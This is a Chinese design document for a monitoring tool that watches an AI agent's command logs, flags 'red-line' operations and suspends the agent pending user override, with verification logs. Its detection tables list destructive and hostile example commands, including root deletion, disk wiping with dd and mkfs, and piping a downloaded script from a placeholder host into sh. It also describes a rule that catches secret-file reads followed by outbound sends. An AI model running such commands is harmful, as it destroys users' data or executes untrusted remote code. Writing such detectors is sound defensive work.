## 3. 红线级判定（规则层）

### 3.1 为什么要分级

v0.4.0 的 `DANGEROUS` 是**一档**：``chmod 777`` 和 ``rm -rf /`` 都叫 DANGEROUS。
但这两者的后果差着数量级 —— 前者改个权限，后者可能把整台机器的根目录抹掉。

守护者要动手，就必须先知道「哪一条值得动手」。所以引入**严重度**：

| 严重度 | 含义 | 守护者反应 |
| --- | --- | --- |
| `red_line` | 一旦执行就回不来 | **可以干预**（挂起 / 中断） |
| `standard` | 危险，但通常可恢复 | 只告警 |
| `none` | 无异常 | 无 |

判定结果字典新增两个字段：`severity` 与 `category`。
**既有字段一个没删** —— 老代码读 `verdict` / `rule_id` / `level` 完全不受影响。

### 3.2 四类红线

实现见 `src/rules/basic.py` 的 `CatastrophicDetector`。

| 类别 (`category`) | 含义 | 典型触发 |
| --- | --- | --- |
| `root_delete` | 递归删除根目录 / 家目录 / 整盘 | `rm -rf /`、`rm -rf ~`、`sudo rm -rf /`、`Remove-Item -Recurse -Force C:\`、`rd /s /q C:\` |
| `mass_delete` | 批量删除大量文件 | `rm -rf /tmp/*`、`find . -name '*.log' -delete`、`git clean -fdx` |
| `disk_wipe` | 整盘抹除或覆写块设备 | `format c:`、`mkfs.ext4 /dev/sda1`、`dd if=/dev/zero of=/dev/sda` |
| `remote_exec` | 下载远程内容直接执行 | `curl http://x/a.sh \| sh` |

类别可在 `config/config.yaml` 的 `rules.catastrophic.categories` 里逐项关闭。

### 3.3 判定方法：结构化特征，不是「看着危险」

守护者误报的代价是**挂起用户正在跑的正事**，那比不拦更糟。
所以红线判定全部基于**可解释的结构化特征**：

- **根路径** —— 归一化（小写、反斜杠转正斜杠、去引号）后落在根目录白名单里
  （`/` `~` `/etc` `/var` `$HOME` `C:\` …）；
- **通配符** —— 目标含 `*` / `?`，且命令带递归语义（`-r` / `-R` / `--recursive` / `/s`）；
- **块设备** —— `/dev/` 路径；
- **管道执行** —— 下载命令直接管道给 `sh` / `bash` / `python`。

删除类命令用**词法解析**而不是纯正则：
按 `;` `&&` `||` `|` 切段 → 找删除命令（允许 `sudo` / `env` 等包装器前缀）
→ 分离选项与目标 → 只在**带递归语义**时才继续判定。

因此这些**不会**误判成红线：

```
rm -rf /var/data      ← 普通目录
rm -rf ./build        ← 普通目录
rm -rf node_modules   ← 常规清理
chmod 777 /var/data   ← 普通高危
git clean -n          ← 试运行
```

### 3.4 第二个红线触发源：LEAK + 外部地址

`root_delete` 之类的红线是**单步**判定（规则层）。而「读了 `.env` 紧接着往
外部地址发」是**跨事件**判定，属于上下文层（`ContextTracker`）。

v0.4.0 的 LEAK 只知道「读了敏感文件 + 执行了外发操作」，不知道发到哪儿。
v0.5.0 补上了目标解析：

| 外发目标 | 判定 | 说明 |
| --- | --- | --- |
| `127.0.0.1` / `localhost` / `::1` | 内部 | 数据没离开本机 |
| `192.168.x.x` / `10.x.x.x` | **外部** | 内网地址同样把密钥送出了本机 |
| 公网 IP / 域名 | 外部 | 域名在解析前无法证明是本机，保守处理 |

内部主机名单可用 `guardian.internal_hosts` 扩展。

命中「LEAK + 外部地址」时，告警的 `severity` 会被抬成 `red_line`，
`category` 记为 `leak_external` —— 守护者据此行动。

> **顺带修掉的一个盲区**：`_SENSITIVE_FILE_RE` 原先要求敏感文件名前面是
> 路径分隔符，于是 `cat .env` 这种最常见的读法**匹配不到**，
> LEAK 根本不会触发。现已放宽为「路径分隔符**或空白**」。

## 4. 守护者模式（核心）

### 4.1 权限模型

> **权限必须小于用户。**

守护者只有三种能力，每一种都被约束住：

| 能力 | 约束 |
| --- | --- |
| 挂起（suspend） | 可逆，随时 `resume` |
| 中断（SIGINT） | 可逆，进程可自行收尾 |
| 放行（override） | **用户专属**，且随时可用 |

四条硬约束：

1. **绝不 kill 进程** —— `ProcessController` 里**根本没有** kill 方法；
2. **不碰 PID 0 / 1 / 哨兵自身 / 哨兵的父进程**；
3. **必须可被否决** —— 用户放行后该规则在本次任务中不再被拦截；
4. **必须留痕** —— 干预与放行都写进 `logs/`。

### 4.2 挂起与恢复的底层实现

实现见 `src/core/guardian.py` 的 `ProcessController`。

#### 挂起 `suspend(pid)`

| 平台 | 底层机制 | 可逆性 |
| --- | --- | --- |
| Windows | `psutil.Process(pid).suspend()` → 内核 `NtSuspendProcess`，冻结该进程**所有线程**的调度 | `resume()` → `NtResumeProcess` |
| Linux | `psutil.Process(pid).suspend()` → 内核 `SIGSTOP` | `resume()` → `SIGCONT` |
| macOS | psutil 未实现 → 退回 `SIGSTOP` | `SIGCONT` |

Windows 的 `NtSuspendProcess` 冻结的是**整个进程**（全部线程），
所以被监控的 Agent 会**完全停住**——不是「正在执行的这一条命令停了」，
而是整个 Agent 都不动了。这正是我们要的：让用户有时间决定放不放行。

#### 中断 `interrupt(pid)` —— 平台差异是重点

| 平台 | 动作 | 说明 |
| --- | --- | --- |
| POSIX | `os.kill(pid, SIGINT)` | 真正的 Ctrl+C 语义，Agent 有机会自己收尾 |
| Windows | **刻意不实现** | 见下 |

> ⚠️ **Windows 上绝不能用 `os.kill(pid, signal.SIGINT)`。**
>
> CPython 在 Windows 上会把 `os.kill` 翻译成 `TerminateProcess` ——
> 那是**终止**，不是「中断」。被监控的 Agent 会直接消失，
> 它没机会保存工作区、没机会清理临时文件。
>
> 那用 `GenerateConsoleCtrlEvent` 呢？也不行：它作用于**整个控制台进程组**。
> 目标进程若不是以 `CREATE_NEW_PROCESS_GROUP` 创建的进程组组长，
> 这次调用可能波及**哨兵自身**和用户正在跑的其它程序。
>
> 那已经不是「干预」，那是「误伤」。所以 Windows 上
> `interrupt()` 直接返回失败，`auto` 策略**自动降级为挂起** ——
> 挂起同样能阻止破坏，而且随时能恢复。

#### 降级链

```
auto ──► Windows : suspend
     └─► POSIX   : sigint ──失败──► suspend
```

#### 找不到 psutil 时

`psutil` 是**可选依赖**。没装时 `ProcessController` 优雅降级：
所有动作返回 `{"ok": False, "error": "psutil 未安装"}`，
哨兵退回到「只报告、不动手」，其它功能完全不受影响。

### 4.3 怎么找到被监控进程

PID 解析顺序：

1. 调用方显式传入（`--target-pid`）；
2. 配置 `guardian.target_pid`；
3. 配置 `guardian.pid_file`（读文件）；
4. **自动探测** —— `detect_pid(log_path)`：遍历 psutil 进程列表，
   找命令行里**包含被监控日志绝对路径**的进程。

第 4 条是主力：哨兵读的就是那个 Agent 写的日志，
而那个 Agent 的命令行里通常就带着这个路径。

探测不到也不影响审查 —— 只是干预退化成「报告但不动手」。

### 4.4 用户否决权（Override）

拦截发生时，终端 / GUI 会给出**一字不差**的提示：

```
[哨兵已拦截] 发现高危操作，已暂停目标进程。输入 'override' 可放行并让哨兵在当前任务中不再拦截该规则
```

三条放行通道：

| 通道 | 用法 | 适用人群 |
| --- | --- | --- |
| 终端输入 | 在哨兵终端敲 `override` | 纯终端用户 |
| GUI 按钮 | 告警卡片上的【放行并忽略】 | 看板用户 |
| API | `POST /api/guardian/override` | 自动化 / 二次集成 |

放行做三件事：

1. **恢复**被挂起的进程（`resume`）；
2. 把该 `rule_id` 加入**本次任务**的黑名单 —— 同一规则不再被拦截；
3. **留痕**。

> 「本次任务」是刻意的：哨兵下次重启还得重新问一遍。
> 权限可以临时放宽，不能永久固化。

永久白名单另走配置：`guardian.allowed_rules`。

### 4.5 留痕

| 文件 | 内容 | 格式 |
| --- | --- | --- |
| `logs/guardian.log` | 干预与放行的**人类可读**审计流水 | 纯文本，一行一次 |
| `logs/guardian_overrides.json` | 「用户已覆盖高危决策」的**结构化**留痕 | JSON，含 `decisions` 数组 |

`guardian_overrides.json` 的每条记录包含：
`action` / `timestamp` / `stamp` / `rule_id` / `pid` / `resumed` / `reason` / `source`。

`source` 取值 `gui` / `stdin` / `api` / `engine`，用于复盘时区分是谁做的决定。

### 4.6 拦截流程

```
事件 ──► RuleEngine.check_event()
          └─ severity == "red_line"?
             ├─ 否 ──► 普通告警（只弹窗）
             └─ 是 ──► SentinelEngine._maybe_intervene()
                        └─ Guardian.intervene()
                           ├─ 守护者未启用？   ──► 跳过
                           ├─ 规则已被放行？   ──► 跳过
                           ├─ PID 定位不到？   ──► 报告但不动手
                           ├─ PID 受保护？     ──► 拒绝
                           └─► controller.intervene()
                                └─► 写审计 + 发事件 + 回填 alert["guardian"]
```

**任何一步失败都只降级，绝不抛异常** —— 审查侧的异常绝不能影响
被监控的 Agent（架构红线 R5）。

## 5. GUI 实时干预按钮

### 5.1 后端端点

| 端点 | 方法 | 作用 |
| --- | --- | --- |
| `/api/guardian/status` | GET | 守护者状态（是否武装、目标 PID、被挂起的进程） |
| `/api/guardian/intervene` | POST | 【强制中断】执行一次挂起 / 中断 |
| `/api/guardian/override` | POST | 【放行并忽略】恢复进程 + 规则拉黑 |

守护者以**鸭子类型**注入（只需 `status()` / `intervene()` / `override()`），
GUI 应用层因此**不 import** `src.core.guardian` —— 与 v0.4.0
「GUI 不 import 引擎」的解耦原则一脉相承。

### 5.2 前端

- 告警卡片新增**干预条**：【强制中断】（红）+【放行并忽略】（橙）；
- 红线级卡片加 `alert-card--redline` 描边发光 + 「红线级」标签；
- 顶栏新增 `GUARDIAN 武装 / 关闭` 状态芯片（每 10 秒轮询）；
- 守护者未启用时按钮**禁用**并给出说明 —— 不让用户点了个寂寞；
- 干预结果走 toast + 事件流，SSE 实时广播给所有打开的看板。

### 5.3 安全

干预端点与其它端点一样受 **Host 守卫 + Origin 白名单**保护：
外部 Origin 的跨站请求一律 403，**不能触发干预**。
（这很重要：否则任何网页都能让你的哨兵挂起你的进程。）

## 6. 关键设计决策

| 决策 | 理由 |
| --- | --- |
| 守护者默认关闭 | 权限必须小于用户。默认开启 = 默认比用户大 |
| Windows 上不做 Ctrl+C | `GenerateConsoleCtrlEvent` 会波及整个控制台进程组 —— 那是误伤 |
| Windows 上不做 SIGINT | `os.kill(SIGINT)` 在 Windows 上等于 `TerminateProcess` |
| 进程控制独立成类 | 测试可以 Mock 掉信号发送，**测试永远不该真的挂起谁的进程** |
| 红线宁可漏报不误报 | 误报会挂起用户正在跑的正事 |
| 放行只在本次任务生效 | 权限可以临时放宽，不能永久固化 |
| 内网 IP 算「外部」 | 内网地址同样把密钥送出了本机 |
| 域名在解析前按外部处理 | 无法证明是本机时，保守 |
| GUI 用鸭子类型注入守护者 | 保持「GUI 不 import 核心层」的解耦原则 |

### 8.1 实机验证

单元测试用假控制器，**不能证明真能挂起进程**。所以另外做了实机验证。

**平台能力**（本机 Windows）：

```
child pid = 35864
status before        = running
status after suspend = stopped     ← psutil.Process.suspend() 生效
status after resume  = running     ← psutil.Process.resume() 生效
```

**端到端自检**（`scripts/verify_guardian.py`，可重复运行）：

```
[1/7] 被监控进程已启动：PID=32024
[2/7] 看板已启动：http://127.0.0.1:8125
[3/7] 守护者状态：enabled=True target_pid=32024
[4/7] 扫描后被监控进程状态 = stopped                       ← 红线 → 真挂起
[5/7] 看板告警 1 条，其中红线 1 条
[6/7] 放行后：ok=True resumed=True 进程状态=running        ← 真恢复
[7/7] 已放行规则 = ['catastrophic_root_delete']；留痕文件齐全 = True
✅ 守护者端到端自检全部通过
```

**真实点击**（CDP 驱动 Edge，点的是看板上的真实按钮）：

```
点击前，被监控进程状态 = stopped
点击结果： clicked: 执行中…
点击后，被监控进程状态 = running
守护者状态： {"overridden_rules": ["catastrophic_root_delete"], "suspended_pids": []}
```

**留痕实测**（`logs/guardian.log`）：

```
2026-10-26T23:56:37  intervene  rule=catastrophic_root_delete  pid=42336  ok=1  source=engine  红线级命中：递归删除根目录 / 家目录 / 整盘（/）
2026-10-26T23:58:12  override   rule=catastrophic_root_delete  pid=42336  ok=1  source=gui    红线级命中：递归删除根目录 / 家目录 / 整盘（/）
```

`logs/guardian_overrides.json` 同步记下 `resumed: true` 与 `source: "gui"`。

界面实拍：[`docs/assets/dashboard-v0.5.0.png`](../assets/dashboard-v0.5.0.png)
（顶栏 `GUARDIAN 武装` 芯片 + 红线卡片 + 两个干预按钮）。

### 8.2 实机验证抓到的一个前端 Bug

第一版实拍里，按钮虽然渲染出来了，却是**禁用**状态。

原因：按钮的可用状态在**卡片渲染那一刻**就被写死，
而守护者状态来自**另一个异步请求** —— 两者谁后到不确定。
守护者状态后到时，没人去解锁已有卡片上的按钮。

修法是把它变成**单一数据源**：`refreshGuardianButtons()` 统一管理，
并在三个时机调用（插入卡片后 / 状态加载后 / 守护者状态变化后）。

> 单元测试覆盖不到这一类问题 —— 这正是「必须实机看一眼」的理由。

## 9. 怎么用

### 终端

```bash
# 1) 打开守护者
#    config/config.yaml 里把 alert.intervention_mode 改成 "guardian"

# 2) 跑起来（会自动探测被监控进程）
python -m src.core.engine <日志文件>

# 3) 看到红线时，敲 override 放行
override
```

### 看板

```bash
python -m src.gui.server --watch <日志文件> --port 8000
```

告警卡片上直接点【强制中断】/【放行并忽略】。

### 单独跑

```bash
# 临时开一次守护者，不改配置
python -m src.core.engine <日志文件> --guardian --target-pid 12345
```

### 自检

```bash
# 端到端自检：起一个自己的子进程，验证挂起 → 放行 → 恢复 → 拉黑 → 留痕
python scripts/verify_guardian.py

# 给看板出图（写进 docs/assets/）
python scripts/capture_dashboard.py --url http://127.0.0.1:8000/ --probe
```
